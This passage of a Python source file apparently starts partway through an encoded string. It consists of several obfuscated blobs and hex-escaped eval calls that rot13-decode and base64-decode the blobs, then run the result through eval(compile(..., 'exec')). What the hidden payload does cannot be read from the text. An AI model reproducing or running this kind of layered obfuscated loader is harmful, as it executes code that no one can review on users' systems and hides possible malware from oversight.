0NzU1OTZjMzQ0YTY3NzM1Mzc0NzI3MzY4NzU2ZjQyNDY2ZDQ0NjY0ZTZhNGU3MjY3NTMzOTRhNjU3MDZiNmE2OTY5NDg1NDQyMzM3NzY2NTE0ZjJmNjQzMDUyNDc3MDU3NzQ1YTczNzU3MzYxNTQ2MTU4NzI1NjMyNjI1Mzc2NjMzNzVhNzI1NzUyMzM2ZDZkNmE1MDYzNDM0YjcxNGY1MTZhNzE0Zjc4NDM3NDZjMzYzNzJmNDk0NzY3MmY2NDY1NzM0YjZlNTIzMzUyNmI2MjQ1N2E1Mzc2NTIzMzUyNDc3MDc5NTE1NzZkNGEzNzQ2NDQ2NTdhNzI1MDYyNGI0ZTMxNzgzMjRlNzA0YTc5MzI0MjU4NDkzMTcxMzk0ZTY3NTM1YTU0Njk2ZDJmMzAzOTY3NjQ0ODU5NjkzNjQzNTY3MDczNTM0ZTY0Mzc1OTQ4NjU0ZDYxNDE2NDUyNzYzNzY4NmIzMTMxMmY3MzZjNzM2NzYzNzAzMDRjNTk1ODUzNGU3MTRhNTQ1YTQ3MzU1MDY2MzA1MjQ4NGY0YTMzNzE3ODYyNGU1MzRhMzk3NDQ3Mzg2OTZkNTQzMzZjNGY0ZTZmNjUyYjQ1NzE0YTYxNDI2MjZhNTI0OTYyNGM1MzUxNzU2OTQzNzY1MTc2NjQ3Njc2NWE3ODU2NzU1MDM2NDM3NDMxMzQ3MTZmMmYzMDQyNmE3MDU0NmI3MDU4NmQ2OTY4NDY1OTYxNzk2NTM2NDk0YTMwNjQ1NTc2MzY0MjJmMzM1NzRhMmI0YTUwNjUyYjVhNTU3NzZkNTMzMDU3MzM2MjMzNDI2MjMwNmI0NTY3NzkyYjYxNjMzODU3NzA3ODUyNjE0ZjU2NjY1MTY4NTk0ZDZkMzM2NTY5NTU1NTc3NDM2MzU2NzE0Mjc0NDM3MjZmNDk3NTMyNTMzMzUwNjE0ZDM4NTQ3NjUxNmEzMjY5NzY2YjRlNDUzNTVhNTU1MDM3NTM2ODUzMzY0ZDcwN2E3YTU5NjI1YTM4Mzg3NTM4NjE2ZDZmNDc0NjQ1NzA0YjZjNTQ2ZDMwNjk2OTdhMzYzNzc0NTM1OTMyNmYzNDU5NmE1NzYzMzY0YjQxNjQ2YjM5Mzc2MzU4MzI0NDcxNDM3YTc0NGI2ODJiNmU1YTQ3NmE2NjQ4NjE2MzMyNDU0ODYzMmIzMjU2NTY1ODY3NzI1MTU4NzA2ZTUxNmU0Yjc3NjYyYjUyMzk1MTUyMmIzNDc4NjQ1NTRkNjE1YTZmMzU0YTcwNDc2NjQ1MzM2YTY2Mzc0ODYzMzA1NDJiMzQ3MTY2NzM2NzY4NGU3ODQ5NDc3MjQxNGM2YTc2Mzk2ZDRiNjc2MTM5NGY1Mzc5NTczMDM5MzYyZjU1NDYzODc3NjE1ODM5NDMyZjcxNzMzMDU0MmI0YTQ2NmYzNDMwNzc1MTM3NzM0ZTYyNzUzMTY3Mzg2NzY2NjY0MTZiNzE2ZTQyNjE1MTU1MzAzNDM1NDc2ZjQ5NGI0NTY3MzA2ZDY1NmQ3MzU4Mzc0YzcxNGI2ZTU3NTk2Yzc1MzczNjU1NDMyZjc5Njg1OTcyNjM1YTM5NzM1NTc1NGQ2MTY1NDU0NzRmNjQ0YjM4NmUzODY5NjE2YzY1Nzg3NTc5MzU3ODYyMzc0MzQ5NzI2YjM2NzA2YzMxNzk1MTQ5NDUzNDcwNDk0OTYxMzY1MjQ5NDc2NTM2NDQ0YzZhNDQ2ZDRmNmQ1NDU4MzU2YjRmNmI1OTU0Mzk0OTUyMzI0YjRmNjg0ZjRhNzE2OTc4NmY0YTc2NzM0ODRlNGU1MDc4NjQyYjRhNmE2ZTQ2NTA2ZDUzMzc1MzcwNTk3Mzc2NGI0MjU0NzM2ZDU4NTM0YzUwNzU2ZTUwNmY0ZTRkNTc0ZTQ3MzI1MTRjNzI0ZjY3NTI0YjUzNTg0YjRhNTEyZjc5NjcyZjM2NmMzNzc4Njc1MDMxNDU3ODUxNjYyZjU5NTc1NjM3NTQyZjc5NTk2YTMzNWE3YTc1NmI0YTY3N2E0ODYxNjU1ODcxNDU2NjMxNmE0ZjY0NGIzMTZmMzk1NDQ4Nzg0YzJmNjE0YzYzNzk3MjY2NDU0YzRjNTIzNjZlNTQ1NDRhNTQ3MDZiMzI2ZjMxMzM0YjYzNDk3MzY4NGMyYjY4NDc2ZTQyNDU2NzY2NTU2Mzc0Nzg3OTZiNmE1MTUwNTY3NjY5NTU2YTZjNGYyYjdhNDE0YzcyMzg2MzcwNDQzNjRiNWE3YTQ0MzgzMjM4Njc0MzZlNDgzODU0MmIzNjQ2MmY0ZDU0MzY0MTUwNzQ3MDZiNGUzMDc0NTg0ODM3MmY2ZTZlNjk0NTcyNDg0YTM4NjIzNTQ2NTY0NjU0NTYzNjVhNjY1YTQyNzA0ZDU1NGE0YjUzMmI1MjUwNzg1NDZjNDI2ZDZmNmY0ZjQzNjI2ODQxNTY3Nzc4MzU0NTRjNTk2NzQ3NDU3MzU2NTg0OTM1NzE1NzQzNjg0YzYxNmE1NjRlNTU3YTRjNjU0ZDU5Mzg2OTc2NGQ3NjU4NDI0YjUyNmU2ZDQ3Nzk0YjYyNTI0NjRiNjUzMzU4NzQzNzZjNDY0ZDc1MzM2Njc5NDk2ZTc3NGY2ZTMxNjc1MTY0NGE2NTZmNzYzNzMwNjM2YTQzNmMzNzQzNmU3NzU1NmM0NjY4NTM2NTZiN2E3OTQ0NmY0MzczNzAzMTc4NDY1NjQ2NmE1NDM2NGI0ODVhNDk2NjM1NDczNDc3NmQ2YjU1Njg3OTY3NTE1NTU3NzY2MTM4NWE2Yjc4NGU2YjczNmM0ODM0NDI3NTMyNjg2OTZlNTc2ZDQ0NTA1MjQ2NzM0NTU2NTI3YTMzNDgzNjYzMmY0ZjQzNTg0MTYxNTE0MjRmNjIzODZiNTU0MzMyNGQ1ODM0N2E3OTZlNzA0NjQxNjYzODQ0MzI1YTY1NzU1MDMwNmE1NDVhNGY2MTU5MzI2ZjczNjE0MzdhMzM0YTM5NTQ1MTQ0NGEzOTUyMzczMzUxNmU3OTc5NTQzOTY5NzE2ZjQ2NjI3NTMxNDI3NjRlMzc0YTRkNjc3MDM2NTAyYjU1NTc0NDcyNDk3NjZiNTQ2YzRmNDEzMTQ1NDg3OTU3MzY1NDYyMzA0Yjc1NzY2ZTZlNzQ0MTQyNTI0YTZiMzUzNzVhNDc0ZTRkNzM0ZDU2MmY0ZTQ0NTc2OTU0NzA3Nzc5NGI1NTY2MzU3OTMzNTQ0OTYzNzgzMzM1Njg3YTdhNDU2YTM0NmQ3MTVhNzI3MTY3NjQ1YTc3NTc3NDQ3NDYzMzZjNTQ1MDQ3MzA2MjRjNTE0MjU0MzEzMjJmNTM2NDcxNDU2YTMzNmE0YzU4MzI0MTYxNGE2Mzc2Mzg3MDQ2Mzg0Yjc2MzQ3MzM2NGUzNDc3Nzk3MDJmNTQ0NjRmNzQ3ODQ3NmY1YTc4NTA1MzU3NGI2ZTZmMzI2ZjU4NmI1ODU1NmI2ZTZkNDUzODcwNDQzNDc3Mzc2OTcwNmE2NjRiNjc1MDU0NDkyYjRkNTUzOTUxNGE3NjZkNmU1NDQ4NGQ3NzY2NmYzOTMyNGY1MjQ2MzA2ZDUyNGU2ZTQxMmYzMTRiNzA2OTcxNmY2YTMyNDc2MzJiNGE1MDcwNDIzOTVhNTI2ZTM2NGUyZjc5Njg1MTQ0MzQ3OTRiNmU2ODMzNzIzNTdhNmU3NzMwNmY2YzY1MzkyYjQzMmYzOTZlNmM0ZTUwMzI0OTY0MzU2Nzc2NzY0NDc2N2EzNjY2NjU1NjRjNjkzMDY0NGU1MDQ3NTk2MzVhNjYzMjU4Nzk1MzRiNjE2ZTVhNGI0YjUwNGI0MjZjMzE3MjZjNjg0ODRkNDEzNTc3NGY3MTRmNTM0YjUxNjIzNjQ2NjE2MzZlNDc1YTc1MzI3NDRjNjUzMTRlNmIzNzRjMzQ0NDZjMzQ3YTMwNTk1NTMyNzg1NDU1NzQ2ZDRjNjU0YTc1NzE3MTRmNDM1NTZjMzY0ODU1NzU2NDUxMmY3NDY3NGU0ZTRkNmU1MDcxNjc3NjU4NGU3MTZiMzI2NzcyMzQ3ODUzNmU0MTRhNjk0NDcxNjU2NjZlNmM0OTQ0NGU2MTU2NDQ2MTQyNjY1NzRkMmY1MzcwNGYzMzU3NTE3OTU0NTM1NDU0NDk2ZjdhNDQ0NTZiMmI2OTczNjMzNTc4NzA1NzM2NDI1MDMzNDI0YjY5NDgzNzRkNjE1MzRhNDY2YzQyMzE3ODUzNTc3OTVhMzk2NDVhNTU3MDZmNGE0OTZjMmY0MzQ2NGY0Njc4Njg1NDUzNmQ1NDQ0MzY3OTU0NGYzMDQ4NzM0MjcwNmIzNjRkNjE1NjRmNDY0YzUyNzgzMzU0MzI2ZTMwNDM1MjY1NTM3NDc3NmEzMjZiMzkyZjZiNzE2YjczNmY3MTQ4NWE0ZjQ1MzA3MTc0NTU1MTMwNTQ2OTUzNzc2ZTY5NTI2MTc5NmU1MDRiNmIyZjYxNjM2MzZhNGU2YzMyNzM1YTZjNTA1MzY2NTQ2ZjQ5Nzc3MjQ2NjU0ZjM1NmY0Yjc0NTM2NjM4NzUzMDMxMzE2OTY2Nzk2MjUxNTkzODJmNmUzNjU3NTc2NDc3NTAzMDM2NmU0MzRkMzM1MDM2NTQzMTRmNmE1NDRjNTA3OTYzNTM0NjRlNmIzNjJmNmU1YTM1MzY2YjYzNmQ2ZjZjNmU0OTY2NzAzMTc4NWE3ODc4NTA0MjVhNDI3OTU0NzE1MTY0NGYzMjU1NmY2NDQ5NmM0ZjQxNTQyZjM4NDEzMzY1NWE3MTZhNDMyYjY3NjczOTRkNWE0ZDc2MzM0NDQ3NGI3NzRjMzY2ZjMzMzQ3YTc2NTg2YTY0NDMzMzM5NDk1YTQ5MzQ0MTY2NmI0ZDZiNjg2NjU0NzQ2NDZhMzU0ZjQ1NTg0ODUwNGQ2MTM4NzgzMzcxNDY1NTMzNGI0ZDc2NjIzNDZkMmI2MzU2NmM2NjYzMzIzODc5Njk2YjU1Nzk1OTc0NmE2NjU3NTk0YzRiNmEyZjZjNzg0YjQ2NGQ0NDMyNzk2NDM1MzE1MTUwNWE1MjU0NGE0NjRhNjg0ZDUzNTkzMTMxNzU3YTM1NGY2ZjJmNDM1YTQ3NzE2NDMxMzc2NTY1NTU0NjY0Mzk2YTZlNTU1MzU1MzMyYjYyMzA3MDY0NTE1MjcyNDQ2NjQ5NGUzNjYzN2E2NDRhNmIyYjM0MzM1MTZiMmY2MzUzNGY1YTRiNzE0MjRlNjU2NTRiMzk1NDZlN2E2ZjRkMzMzNzZhNGI0NDQ4Njg2ODcxNmU0YTU0MzQzNTU2NjM2YTcwNGM0NTM3NzY1MzY4MzY1NzRmNzc1ODcyNDY1OTZiNjYzMDMzNDg0MzRlNjg3NjcyMzA1ODQ1NDMzNjMzNmM3NjZmNDYyZjc4NjY3MzYxMzg0NTMyNmU1MDc1NDY1MTM5MzY1NzVhMzk1MzUyNTM2NTM5NTk1NjRkMzY2MjRhMmI1YTc5MzA3MDMwMzI1NzRkNmQ3YTRhNmM2ODMwMmY0NzUwNWE2ZTUzMzQ0NDU0NGY2ZDQyNjU1ODZlNGM1OTcxNDc2NDYzMzU3MDYzNmM3MDMxNGM1NTJiMzg2OTUwMzE3MzU0NDg3MTY3NjY1NTMxMzA1ODQ3NzA2MTMzNjc1MDM0NGU1NDY0NDc0ODY0NmI1MzZmNmEzMzUyMzk1OTc4NGQ3NTMwNzk2YjY1NmI0YTUxNjQ1NjM1NGUzMjRkNjQ2NjUzNDEzOTM0MzU1NDY5NGY0ZTU4MzY3NDQyMzE0Zjc0NjQ0MzRmNDkzODZiNzQzOTQyNzY0YTMzMzE1ODMyNzI0ZjYzMzQ0ODU1NGEzNzM4NjM2NDM0NmM2MzcwNmIzNDZjNTI3MzU1NTY0MjMxNzU1NjM5MzA2ZjJmMzk2ZDM0MzU1MzQyNTQ0ZDY5NzE0NTY2MzM0NzJiNzA1NjRkNjQ3YTZlNmEzOTQ3NmU3MDc5Mzg1Mzc1MzY0NTU4Njk0NjY1MzEyZjU0NjIyZjU3NWE0NzcyNDM1YTVhMzU2MzZhMzE1MDY4NzM2Y'
keymaker = 'wL2ZmNmAGEvAQt2AmL4AQt2ZmZmZmH2MQD4AGR0LGL1AwplLwZ0Amx1ZQL5AQLlMwMwAmt1ZGHmAwD1ZwL2AwR2MQMyZmtlLwL2AGH2LmHlAmN3ZwDlAmN2LwH3AGx3AQZmATH2AGEuAGR0MGpkZmxmBGWzATLlLwZmZmp2ZGMyAwL2ZGZmZmZ2BQL4ATR3BGMzZmH2MwpjAmN2MQH4AzRmZwZ3AQV2ZGZ2Awp2MQMvAJR2AGZlAwV3ZwZ4AGV2AmHmZmp3LGH0AGLmZwDmAzL2LGp5AQH2LGZlZmV0BGL3AwHmZGEyA2R3ZmHjAQt3AQZ3AzH0AmMwAmZ2MGD3AzD2AmHlZmR1BQHjAJR0LGH3AQL2MGpjAQD2ZGMwAwp3BQDmAmtmAQZkAQD3ZwHlAQx0MQD2AzR1AmZlZmp0AGIuAGH2MGLkAmD2MwHmAmN2ZwZ0AwV1AwplAGR2AQDlAQZmZwH2A2R3ZmWzAQp3LGEyAzH1Zwp3AQt0MwEwAQt1ZmD1AzR1LGpkAwD2LGp5AmRmAmHjATZ0AmEuAzH0ZwD4AGV0BGIuAmx0MQH4AGL0ZwH0ZmNmAwZ0ATV0MwH2Awt3ZmL5AzH1AwEzAwx2MwH5ATZ0Mwp0ZmN1Zwp3AwRmZQZkAGR2ZmEvZmH0MGL4AGRlLwL5Amt2ZwpjZmN2AQD2Amx2BGMyAQD2AmMyZmV2BQDlAmDmZGD1AQR3AwZkZzV2MGpmZmV3ZmL4Zmp1ZwEyAGt2ZwWzAQp3AmEyATH3AQD4ZmR0AGZkAQt3AwMyATV2AmpjZzLmZQp1ZmL1AmMvAQH3ZQquZmR2ZwEvAwV2AmMuZmH1BGpjAwD0AwHmAwH2ZmMvAJRmBQLmAQpmBQpjAzR0ZwExAmp1ZwZ5AmVmZwHlAGN2Mwp1AGV0AGL5ZmNmZGDlAGZ1AwEyAwV0BGWvATR2LwDmAGD3ZGL1AmZlMwp0AQZ3AQHjAmt0LmH1AQtlLwL5Zmp3AGZmAwD0ZmD2ZmRmBQHkAwt2AwEvATR1BQZ4Amt1ZQWzAQL2AGLlAQV0AQH2Awt1ZwZ2AQx3ZmpjZmH2LmEzAwx0AwHmATZ1AQp0AQZ1AwpmAGp3ZQDkAQHmBGH0ZmH0BGWvAzL0MGquAmZmZQZ3AzL2ZGH0AQRlLwquZmN0AmEzAmt0ZGZ4AwV2LmH2ATH1BGZ5AmD1AmL1A2R1A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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
